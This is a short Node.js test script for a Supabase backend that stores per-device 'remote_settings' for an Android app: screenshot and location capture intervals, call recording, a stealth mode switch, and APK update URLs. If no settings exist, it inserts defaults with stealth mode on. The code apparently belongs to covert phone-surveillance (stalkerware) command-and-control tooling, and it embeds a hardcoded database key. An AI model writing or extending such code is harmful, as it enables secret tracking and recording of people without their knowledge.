const { createClient } = require('@supabase/supabase-js');

const dbUrl = 'https://kubowqqqawkgghxcktoe.supabase.co';
const dbKey = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Imt1Ym93cXFxYXdrZ2doeGNrdG9lIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzM3MTIwNzksImV4cCI6MjA4OTI4ODA3OX0.RnKtHRnqrdh0wF4vl-LWQEjlw7uYDCThqAn23WBMafM';
const supabase = createClient(dbUrl, dbKey);

const deviceId = 'e3f7241cd4780fb0';

async function run() {
    console.log(`Simulating fetchSettings for device: ${deviceId}`);
    
    // 1. Simulating: select columns from remote_settings
    const selectRes = await supabase.from('remote_settings')
        .select('screenshot_interval_ms, location_interval_ms, record_calls, stealth_mode_active, target_version, update_apk_path, update_apk_url')
        .eq('device_id', deviceId)
        .maybeSingle();
        
    console.log("Select status:", selectRes.status);
    console.log("Select error:", selectRes.error);
    console.log("Select data:", selectRes.data);

    if (!selectRes.data) {
        console.log("\nSimulating initializeDefaultSettings (insert)...");
        const insertRes = await supabase.from('remote_settings')
            .insert({
                device_id: deviceId,
                screenshot_interval_ms: 60000,
                location_interval_ms: 600000,
                record_calls: false,
                stealth_mode_active: true
            });
            
        console.log("Insert status:", insertRes.status);
        console.log("Insert error:", insertRes.error);
        console.log("Insert data:", insertRes.data);
    }
}

run().catch(console.error);
